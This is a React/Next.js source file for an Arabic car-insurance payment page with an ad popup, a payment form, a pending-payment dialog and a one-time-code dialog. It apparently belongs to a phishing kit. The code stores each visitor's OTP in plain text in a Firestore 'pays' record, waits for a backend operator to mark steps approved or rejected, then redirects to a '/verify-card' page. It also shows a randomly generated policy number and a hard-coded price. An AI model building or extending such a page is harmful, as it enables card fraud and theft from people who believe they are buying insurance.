"use client";

import type React from "react";
import { useEffect, useState } from "react";
import { motion, AnimatePresence } from "framer-motion";
import Header from "@/components/Header";
import Footer from "@/components/Footer";
import WaitingDialog from "@/components/waiting-dilaog";
import { RefreshCw, CheckCircle, X } from "lucide-react";
import { addData, db } from "@/lib/firebase";
import { doc, onSnapshot } from "firebase/firestore";
import PaymentForm from "@/components/payment/PaymentForm";
import { PaymentSummary } from "@/components/payment/PaymentSummary";
import { PaymentMethods } from "@/components/payment/Payment-methods";
import { PolicyDetails } from "@/components/PolicyDetails";

// Define types for our state
export interface PolicyDetailsType {
  insurance_type: string;
  company: string;
  start_date: string;
  endDate: string;
  referenceNumber: string;
}

export interface SummaryDetailsType {
  subtotal: number;
  vat: number;
  total: number;
}

// AdPopup Component - Enhanced Design
const AdPopup = ({ onClose }: { onClose: () => void }) => (
  <motion.div
    initial={{ opacity: 0 }}
    animate={{ opacity: 1 }}
    exit={{ opacity: 0 }}
    className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/60 backdrop-blur-md"
  >
    <motion.div
      initial={{ scale: 0.8, opacity: 0, y: 20 }}
      animate={{ scale: 1, opacity: 1, y: 0 }}
      exit={{ scale: 0.8, opacity: 0, y: 20 }}
      transition={{ type: "spring", duration: 0.5 }}
      className="bg-white rounded-3xl max-w-lg w-full overflow-hidden shadow-2xl border border-gray-100"
    >
      <div className="relative">
        <button
          onClick={onClose}
          className="absolute top-4 right-4 z-10 w-8 h-8 bg-white/90 backdrop-blur-sm rounded-full flex items-center justify-center shadow-lg hover:bg-white transition-colors"
        >
          <X className="w-4 h-4 text-gray-600" />
        </button>
        <img
          src="/5990160849186178736.jpg"
          alt="Special Offer"
          className="w-full h-64 object-cover"
        />
        <div className="absolute inset-0 bg-gradient-to-t from-black/20 to-transparent" />
      </div>
      <div className="p-8 text-center bg-gradient-to-b from-white to-gray-50">
        <h3 className="text-2xl font-bold text-gray-900 mb-2">عرض خاص</h3>
        <p className="text-gray-600 mb-6">لا تفوت هذه الفرصة الذهبية</p>
        <button
          onClick={onClose}
          className="bg-gradient-to-r from-[#146394] to-[#1e7bb8] text-white px-10 py-4 rounded-xl font-semibold transition-all duration-300 hover:from-[#0f4c70] hover:to-[#146394] transform hover:scale-105 active:scale-95 shadow-lg hover:shadow-xl"
        >
          متابعة
        </button>
      </div>
    </motion.div>
  </motion.div>
);

// Payment Status Dialog Component - Enhanced Design
const PaymentStatusDialog = () => (
  <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/60 backdrop-blur-md">
    <motion.div
      initial={{ scale: 0.8, opacity: 0, y: 20 }}
      animate={{ scale: 1, opacity: 1, y: 0 }}
      exit={{ scale: 0.8, opacity: 0, y: 20 }}
      transition={{ type: "spring", duration: 0.5 }}
      className="bg-white rounded-3xl max-w-lg w-full overflow-hidden p-8 text-center shadow-2xl border border-gray-100"
    >
      <div className="mb-6">
        <div className="mx-auto w-20 h-20 flex items-center justify-center bg-gradient-to-br from-amber-100 to-orange-100 rounded-full mb-6 shadow-inner">
          <motion.div
            animate={{ rotate: 360 }}
            transition={{
              duration: 2,
              repeat: Number.POSITIVE_INFINITY,
              ease: "linear",
            }}
          >
            <RefreshCw className="h-10 w-10 text-amber-600" />
          </motion.div>
        </div>
        <h3 className="text-2xl font-bold mb-4 text-gray-900">
          حالة الدفع معلقة
        </h3>
        <p className="text-gray-600 text-lg leading-relaxed">
          عملية الدفع الخاصة بك قيد المعالجة. يرجى تحديث الصفحة للتحقق من حالة
          الدفع.
        </p>
      </div>
      <div className="flex justify-center">
        <div className="flex space-x-1 rtl:space-x-reverse">
          {[0, 1, 2].map((i) => (
            <motion.div
              key={i}
              className="w-2 h-2 bg-[#146394] rounded-full"
              animate={{ scale: [1, 1.2, 1] }}
              transition={{
                duration: 1,
                repeat: Number.POSITIVE_INFINITY,
                delay: i * 0.2,
              }}
            />
          ))}
        </div>
      </div>
    </motion.div>
  </div>
);

// OTP Dialog Component - Enhanced Design
const OtpDialog = ({ onSubmit }: { onSubmit: (otp: string) => void }) => {
  const [otp, setOtp] = useState("");
  const [otpDigits, setOtpDigits] = useState("");

  const handleOtpChange = (value: string) => {
    setOtpDigits(value);
    setOtp(value);

    // Auto-focus next input
  };

  const handleKeyDown = (index: number, e: React.KeyboardEvent) => {
    if (e.key === "Backspace" && !otpDigits[index] && index > 0) {
      const prevInput = document.getElementById(`otp-${index - 1}`);
      prevInput?.focus();
    }
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    onSubmit(otp);
  };

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/60 backdrop-blur-md">
      <motion.div
        initial={{ scale: 0.8, opacity: 0, y: 20 }}
        animate={{ scale: 1, opacity: 1, y: 0 }}
        exit={{ scale: 0.8, opacity: 0, y: 20 }}
        transition={{ type: "spring", duration: 0.5 }}
        className="bg-white rounded-3xl max-w-lg w-full overflow-hidden p-8 text-center shadow-2xl border border-gray-100"
      >
        <div className="mb-6">
          <div className="mx-auto w-20 h-20 flex items-center justify-center bg-gradient-to-br from-green-100 to-emerald-100 rounded-full mb-6 shadow-inner">
            <CheckCircle className="h-10 w-10 text-green-600" />
          </div>
          <h3 className="text-2xl font-bold mb-4 text-gray-900">
            أدخل رمز التحقق
          </h3>
          <p className="text-gray-600 mb-8 text-lg">
            تم إرسال رمز التحقق إلى رقم هاتفك المسجل
          </p>

          <form onSubmit={handleSubmit} className="space-y-6">
            <div className="flex justify-center gap-3 mb-6">
              <input
                id={`otp-${0}`}
                type="text"
                value={otpDigits}
                onChange={(e) => handleOtpChange(e.target.value)}
                minLength={4}
                className="w-full h-12 text-center text-xl font-bold border-2 border-gray-200 rounded-xl focus:border-[#146394] focus:ring-2 focus:ring-[#146394]/20 transition-all duration-200 outline-none"
                maxLength={6}
              />
            </div>

            <button
              type="submit"
              disabled={otp.length !== 6}
              className="w-full bg-gradient-to-r from-[#146394] to-[#1e7bb8] text-white px-8 py-4 rounded-xl font-semibold transition-all duration-300 hover:from-[#0f4c70] hover:to-[#146394] transform hover:scale-105 active:scale-95 shadow-lg hover:shadow-xl disabled:opacity-50 disabled:cursor-not-allowed disabled:transform-none"
            >
              تأكيد
            </button>
          </form>
        </div>
      </motion.div>
    </div>
  );
};

export default function PaymentPage() {
  const [showAd, setShowAd] = useState(true);
  const [isloading, setIsloading] = useState(false);
  const [showWaitingDialog, setShowWaitingDialog] = useState(false);
  const [paymentStatus, setPaymentStatus] = useState<string | null>(null);
  const [paymentId, setPaymentId] = useState<string | null>(null);
  const [showOtpDialog, setShowOtpDialog] = useState(false);
  const [cardOtpStatus, setcardOtpStatus] = useState<string | null>(null);

  const initPayment = async () => {
    const visitorId = localStorage.getItem("visitor");
    if (visitorId) {
      await addData({
        id: visitorId,
        createdDate: new Date().toISOString(),
        paymentStatus: "idel",
      });
    }
  };

  // Check for payment status in localStorage on component mount
  useEffect(() => {
    if (typeof window !== "undefined") {
      const storedPaymentStatus = localStorage.getItem("paymentStatus");
      if (
        storedPaymentStatus === "pending" ||
        storedPaymentStatus === "processing"
      ) {
        setPaymentStatus(storedPaymentStatus);
      }
    }
  }, []);

  useEffect(() => {
    initPayment();
    if (typeof window !== "undefined") {
      const storedPaymentId = localStorage.getItem("visitor");
      if (storedPaymentId) {
        setPaymentId(storedPaymentId);
      }
    }
  }, []);

  const handleOtpSubmit = (otp: string) => {
    setShowOtpDialog(false);
    setIsloading(true);
    setShowWaitingDialog(true);

    if (paymentId) {
      const paymentRef = doc(db, "pays", paymentId);
      import("firebase/firestore").then(({ updateDoc }) => {
        updateDoc(paymentRef, {
          cardOtpStatus: "processing",
          otpCode: otp,
        }).catch((error) => {
          console.error("Error updating OTP status:", error);
          setIsloading(false);
          setShowWaitingDialog(false);
          alert("فشل في التحقق من الرمز. يرجى المحاولة مرة أخرى.");
        });
      });
    }
  };

  useEffect(() => {
    if (!paymentId) return;

    const paymentRef = doc(db, "pays", paymentId);

    const unsubscribe = onSnapshot(
      paymentRef,
      (docSnapshot) => {
        if (docSnapshot.exists()) {
          const data = docSnapshot.data();
          setPaymentStatus(data.paymentStatus);

          if (data.cardOtpStatus) {
            setcardOtpStatus(data.cardOtpStatus);
          }

          if (
            data.paymentStatus === "pending" ||
            data.paymentStatus === "processing"
          ) {
            setIsloading(true);
            setShowWaitingDialog(true);
            localStorage.setItem("paymentStatus", data.paymentStatus);
          } else if (data.paymentStatus === "approved") {
            setIsloading(false);
            setShowWaitingDialog(false);
            setShowOtpDialog(true);
            localStorage.removeItem("paymentStatus");
          } else if (
            data.paymentStatus === "rejected" ||
            data.paymentStatus === "failed"
          ) {
            setIsloading(false);
            setShowWaitingDialog(false);
            localStorage.removeItem("paymentStatus");
            alert("فشل عملية الدفع يرجى المحاولة مرة أخرى");
          }

          if (data.cardOtpStatus === "approved") {
            setIsloading(false);
            setShowWaitingDialog(false);
            window.location.href = "/verify-card";
          } else if (
            data.cardOtpStatus === "rejected" ||
            data.cardOtpStatus === "failed"
          ) {
            setIsloading(false);
            setShowWaitingDialog(false);
            alert("فشل التحقق من الرمز. يرجى المحاولة مرة أخرى.");
            setShowOtpDialog(true);
          }
        } else if (paymentStatus === "approved") {
          setIsloading(false);
          setShowWaitingDialog(false);
          setShowOtpDialog(true);
        } else if (cardOtpStatus === "approved") {
          setShowOtpDialog(false);
          window.location.href = "/verify-card";
        }
        if (cardOtpStatus === "processing" || cardOtpStatus === "pending") {
          setShowWaitingDialog(true);
          setIsloading(true);
          setShowOtpDialog(false);
        }
      },
      (error) => {
        console.error("Error fetching payment status:", error);
        setIsloading(false);
        setShowWaitingDialog(false);
      }
    );

    return () => unsubscribe();
  }, [paymentId, paymentStatus, cardOtpStatus]);

  useEffect(() => {
    const handleBeforeUnload = (e: BeforeUnloadEvent) => {
      if (paymentStatus === "pending" || paymentStatus === "processing") {
        e.preventDefault();
        e.returnValue = "";
        return "";
      }
    };

    window.addEventListener("beforeunload", handleBeforeUnload);
    return () => {
      window.removeEventListener("beforeunload", handleBeforeUnload);
    };
  }, [paymentStatus]);

  const [policyDetails] = useState<PolicyDetailsType>(() => {
    if (typeof window !== "undefined") {
      const paymentDetails = localStorage.getItem("paymentDetails");
      if (paymentDetails) {
        const parsed = JSON.parse(paymentDetails);
        return (
          parsed.policyDetails || {
            insurance_type: "شامل",
            company: "شركة التأمين",
            start_date: new Date().toISOString().split("T")[0],
            endDate: new Date(
              new Date().setFullYear(new Date().getFullYear() + 1)
            )
              .toISOString()
              .split("T")[0],
            referenceNumber: Math.floor(
              100000000 + Math.random() * 900000000
            ).toString(),
          }
        );
      }
    }
    return {
      insurance_type: "شامل",
      company: "شركة التأمين",
      start_date: new Date().toISOString().split("T")[0],
      endDate: new Date(new Date().setFullYear(new Date().getFullYear() + 1))
        .toISOString()
        .split("T")[0],
      referenceNumber: Math.floor(
        100000000 + Math.random() * 900000000
      ).toString(),
    };
  });

  const [summaryDetails] = useState<SummaryDetailsType>(() => {
    if (typeof window !== "undefined") {
      const paymentDetails = localStorage.getItem("paymentDetails");
      if (paymentDetails) {
        const parsed = JSON.parse(paymentDetails);
        return (
          parsed.summaryDetails || {
            subtotal: 500,
            vat: 0.15,
            total: 575,
          }
        );
      }
    }
    return {
      subtotal: 500,
      vat: 0.15,
      total: 575,
    };
  });

  return (
    <>
      <Header />
      <AnimatePresence>
        {showAd && <AdPopup onClose={() => setShowAd(false)} />}
      </AnimatePresence>
      <AnimatePresence>
        {showWaitingDialog && (
          <WaitingDialog
            isOpen={showWaitingDialog}
            paymentStatus={paymentStatus as any}
          />
        )}
      </AnimatePresence>

      {/* Payment Status Dialog */}
      {(paymentStatus === "pending" || paymentStatus === "processing") && (
        <PaymentStatusDialog />
      )}

      {/* OTP Dialog */}
      {showOtpDialog && <OtpDialog onSubmit={handleOtpSubmit} />}

      <div className="min-h-screen bg-gradient-to-br from-slate-50 via-blue-50/30 to-indigo-50/20">
        {/* Hero Section */}
        <div className="bg-gradient-to-r from-[#146394] via-[#1e7bb8] to-[#146394] text-white py-12 md:py-16">
          <div className="max-w-7xl mx-auto px-4">
            <motion.div
              initial={{ opacity: 0, y: 20 }}
              animate={{ opacity: 1, y: 0 }}
              transition={{ duration: 0.6 }}
              className="text-center"
            >
              <h1 className="text-3xl md:text-4xl lg:text-5xl font-bold mb-4">
                إتمام عملية الدفع
              </h1>
              <p className="text-xl md:text-2xl text-blue-100 max-w-2xl mx-auto">
                خطوة واحدة فقط لحماية مركبتك بأفضل تأمين شامل
              </p>
            </motion.div>
          </div>
        </div>

        {/* Main Content */}
        <div className="max-w-7xl mx-auto px-4 py-8 md:py-12">
          <div className="grid grid-cols-1 lg:grid-cols-3 gap-8 md:gap-12">
            {/* Left Column */}
            <motion.div
              initial={{ opacity: 0, x: -20 }}
              animate={{ opacity: 1, x: 0 }}
              transition={{ duration: 0.6, delay: 0.2 }}
              className="lg:col-span-2 space-y-8"
            >
              <PolicyDetails policyDetails={policyDetails} />
              <PaymentMethods />
            </motion.div>

            {/* Right Column - Sticky */}
            <motion.div
              initial={{ opacity: 0, x: 20 }}
              animate={{ opacity: 1, x: 0 }}
              transition={{ duration: 0.6, delay: 0.4 }}
              className="lg:sticky lg:top-24 h-fit space-y-6"
            >
              <PaymentForm />
              <PaymentSummary summaryDetails={summaryDetails} />
            </motion.div>
          </div>
        </div>

        {/* Trust Indicators */}
        <div className="bg-white border-t border-gray-100 py-8">
          <div className="max-w-7xl mx-auto px-4">
            <div className="flex flex-wrap justify-center items-center gap-8 opacity-60">
              <div className="flex items-center gap-2">
                <CheckCircle className="w-5 h-5 text-green-500" />
                <span className="text-sm font-medium text-gray-700">
                  دفع آمن ومشفر
                </span>
              </div>
              <div className="flex items-center gap-2">
                <CheckCircle className="w-5 h-5 text-green-500" />
                <span className="text-sm font-medium text-gray-700">
                  حماية البيانات
                </span>
              </div>
              <div className="flex items-center gap-2">
                <CheckCircle className="w-5 h-5 text-green-500" />
                <span className="text-sm font-medium text-gray-700">
                  دعم فني 24/7
                </span>
              </div>
            </div>
          </div>
        </div>
      </div>
      <Footer />
    </>
  );
}
